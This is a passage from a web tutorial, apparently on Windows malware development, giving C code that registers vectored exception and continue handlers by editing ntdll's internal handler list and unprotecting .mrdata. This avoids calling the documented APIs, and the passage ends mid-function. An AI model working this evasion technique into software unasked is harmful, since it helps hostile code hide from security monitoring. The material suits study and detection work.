<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Entry Successfully Added @ 0x%p \n"</span><span class="token punctuation">,</span> pNewVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-26">Full AddVectoredExceptionHandlerReplacement Code</h4>
<p>The <code>AddVectoredExceptionHandlerReplacement</code> function is shown below, where it takes two parameters:</p>
<ul>
<li>
<p><code>bFirst</code> - A boolean that specifies whether the new vectored handler should be inserted at the beginning of its list.</p>
</li>
<li>
<p><code>pHandlerFunction</code> - A pointer to the function that will be registered as a vectored handler.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">PVOID <span class="token function">AddVectoredExceptionHandlerReplacement</span><span class="token punctuation">(</span>IN BOOL bFirst<span class="token punctuation">,</span> IN PVOID pHandlerFunction<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BOOL					bEmpty						<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bCfg						<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
	HANDLE					hHeap						<span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	PVOID					pVehListStart				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
							pLdrpMrdataHeap				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
							pLdrEnsureMrdataHeapExists	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_ENTRY<span class="token operator">*</span>	pNewVectoredHandlerEntry	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_ENTRY<span class="token operator">*</span>	pVectoredHandlerEntry		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_LIST<span class="token operator">*</span>	pLdrpVectorHandlerList		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnLdrProtectMrdata		pLdrProtectMrdata			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnRtlProtectHeap		pRtlProtectHeap				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T					sVectoredHandlerEntry		<span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token punctuation">)</span><span class="token punctuation">;</span>

	HMODULE					hNtdll <span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"NTDLL.DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pHandlerFunction<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVectoredHandlerList</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to Get LdrpVectorHandlerList \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpVectorHandlerList @ 0x%p\n"</span><span class="token punctuation">,</span> pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrProtectMrdata</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrProtectMrdata \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrProtectMrdata @ 0x%p \n"</span><span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	bCfg <span class="token operator">=</span> <span class="token function">CheckCFGStatus</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] CFG Enabled\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pRtlProtectHeap <span class="token operator">=</span> <span class="token punctuation">(</span>fnRtlProtectHeap<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlProtectHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrpMrdataHeap</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpMrdataHeap<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrpMrdataHeap \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpMrdataHeap Doesn't Exist, Creating it... \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrEnsureMrdataHeapExists</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrEnsureMrdataHeapExists<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error Resolving LdrEnsureMrdataHeapExists\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token function">LdrEnsureMrdataHeapExistsWrapper</span><span class="token punctuation">(</span>pLdrEnsureMrdataHeapExists<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpMrdataHeap @ 0x%p =&gt; 0x%p\n"</span><span class="token punctuation">,</span> pLdrpMrdataHeap<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		hHeap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap<span class="token punctuation">;</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Acquire the VEH list lock</span>
	<span class="token function">AcquireSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pVehListStart <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLdrpVectorHandlerList <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>VECTORED_HANDLER_LIST<span class="token punctuation">,</span> FirstVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//Make .mrdata RW</span>
	<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>FALSE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//if first entry is pointing back towards the start of the list, it's empty</span>
	bEmpty <span class="token operator">=</span> <span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">==</span> pVehListStart<span class="token punctuation">)</span> <span class="token operator">?</span> TRUE <span class="token operator">:</span> FALSE<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pNewVectoredHandlerEntry <span class="token operator">=</span> <span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"HeapAlloc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//If list is empty, or we want our handler to be first when there are handlers already registered, edit .mrdata</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>bEmpty <span class="token operator">||</span> bFirst<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Adding an Entry to the Start \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>bEmpty<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] No VEH(s) Currently Registered, Setting ProcessUsingVEH Bit \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token function">FlipBit</span><span class="token punctuation">(</span>PROCESS_USING_VEH<span class="token punctuation">)</span><span class="token punctuation">;</span>
			pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>
			pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>

			pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Pushing First Entry Down the List \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH<span class="token punctuation">;</span>
			pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//Update the list so that our added entry is first</span>
		pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Adding an Entry to the End \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Get the last entry</span>
		pVectoredHandlerEntry <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH<span class="token punctuation">;</span>

		<span class="token comment">// Instead of pointing back to the start of the list, point to us</span>
		pVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>

		<span class="token comment">// Our entry is last, needs to point to the start</span>
		pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVehListStart<span class="token punctuation">;</span>

		<span class="token comment">// Make our entry point to the original last entry</span>
		pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVectoredHandlerEntry<span class="token punctuation">;</span>

		<span class="token comment">// Update the list</span>
		pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVEH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Release the VEH lock</span>
	<span class="token function">ReleaseSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Revert .mrdata protection (make R/O)</span>
	<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Refs <span class="token operator">=</span> <span class="token operator">&amp;</span>g_Ref<span class="token punctuation">;</span>
	pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>VectoredHandler <span class="token operator">=</span> <span class="token function">EncodePointer</span><span class="token punctuation">(</span>pHandlerFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Entry Successfully Added @ 0x%p \n"</span><span class="token punctuation">,</span> pNewVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-27">Complete AddVectoredContinueHandlerReplacement Code</h4>
<p>The <code>AddVectoredContinueHandlerReplacement</code> follows the same principle as its <code>VEH</code> counterpart. The only things that are changed are the members used. The <code>AddVectoredContinueHandlerReplacement</code> function is shown below, where it takes two parameters:</p>
<ul>
<li>
<p><code>bFirst</code> - A boolean that specifies whether the new vectored handler should be inserted at the beginning of its list.</p>
</li>
<li>
<p><code>pHandlerFunction</code> - A pointer to the function that will be registered as a vectored handler.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">PVOID <span class="token function">AddVectoredContinueHandlerReplacement</span><span class="token punctuation">(</span>IN BOOL bFirst<span class="token punctuation">,</span> IN PVOID pHandlerFunction<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BOOL					bEmpty						<span class="token operator">=</span> FALSE<span class="token punctuation">,</span>
							bCfg						<span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
	HANDLE					hHeap						<span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	PVOID					pVchListStart				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
							pLdrpMrdataHeap				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
							pLdrEnsureMrdataHeapExists	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_ENTRY<span class="token operator">*</span>	pNewVectoredHandlerEntry	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_ENTRY<span class="token operator">*</span>	pVectoredHandlerEntry		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VECTORED_HANDLER_LIST<span class="token operator">*</span>	pLdrpVectorHandlerList		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnLdrProtectMrdata		pLdrProtectMrdata			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	fnRtlProtectHeap		pRtlProtectHeap				<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T					sVectoredHandlerEntry		<span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token punctuation">)</span><span class="token punctuation">;</span>

	HMODULE					hNtdll <span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"NTDLL.DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pHandlerFunction<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVectoredHandlerList</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to Get LdrpVectorHandlerList \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpVectorHandlerList @ 0x%p\n"</span><span class="token punctuation">,</span> pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrProtectMrdata</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrProtectMrdata \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrProtectMrdata @ 0x%p \n"</span><span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	bCfg <span class="token operator">=</span> <span class="token function">CheckCFGStatus</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] CFG Enabled\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pRtlProtectHeap <span class="token operator">=</span> <span class="token punctuation">(</span>fnRtlProtectHeap<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlProtectHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrpMrdataHeap</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpMrdataHeap<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Unable to Resolve LdrpMrdataHeap \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpMrdataHeap Doesn't Exist, Creating it... \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetLdrEnsureMrdataHeapExists</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrEnsureMrdataHeapExists<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error Resolving LdrEnsureMrdataHeapExists\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token function">LdrEnsureMrdataHeapExistsWrapper</span><span class="token punctuation">(</span>pLdrEnsureMrdataHeapExists<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] LdrpMrdataHeap @ 0x%p =&gt; 0x%p\n"</span><span class="token punctuation">,</span> pLdrpMrdataHeap<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		hHeap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span>pLdrpMrdataHeap<span class="token punctuation">;</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Acquire the VEH list lock</span>
	<span class="token function">AcquireSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVCH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pVchListStart <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLdrpVectorHandlerList <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>VECTORED_HANDLER_LIST<span class="token punctuation">,</span> FirstVCH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//Make .mrdata RW</span>
	<span class="token function">LdrProtectMrdataWrapper</span><span class="token punctuation">(</span>FALSE<span class="token punctuation">,</span> pLdrProtectMrdata<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//if first entry is pointing back towards the start of the list, it's empty</span>
	bEmpty <span class="token operator">=</span> <span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH <span class="token operator">==</span> pVchListStart<span class="token punctuation">)</span> <span class="token operator">?</span> TRUE <span class="token operator">:</span> FALSE<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pNewVectoredHandlerEntry <span class="token operator">=</span> <span class="token punctuation">(</span>VECTORED_HANDLER_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sVectoredHandlerEntry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"HeapAlloc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//If list is empty, or we want our handler to be first when there are handlers already registered, edit .mrdata</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>bEmpty <span class="token operator">||</span> bFirst<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Adding an Entry to the Start \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>bEmpty<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] No VCH(s) Currently Registered, Setting ProcessUsingVCH Bit \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token function">FlipBit</span><span class="token punctuation">(</span>PROCESS_USING_VCH<span class="token punctuation">)</span><span class="token punctuation">;</span>
			pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pVchListStart<span class="token punctuation">;</span>
			pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pVchListStart<span class="token punctuation">;</span>

			pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVCH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{</span>

			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Pushing First Entry Down the List \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			pNewVectoredHandlerEntry<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Flink <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH<span class="token punctuation">;</span>
			pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH<span class="token operator">-&gt;</span>Entry<span class="token punctuation">.</span>Blink <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//Update the list so that our added entry is first</span>
		pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVCH <span class="token operator">=</span> pNewVectoredHandlerEntry<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] Adding an Entry to the End \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Get the last entry</span>
		pVectoredHandlerEntry <span class="token operator">=</span> pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LastVCH<span class="token punctuation">;</span>

		<span class="token comment">// Instead of pointing back to the start of the list, point to us</span>
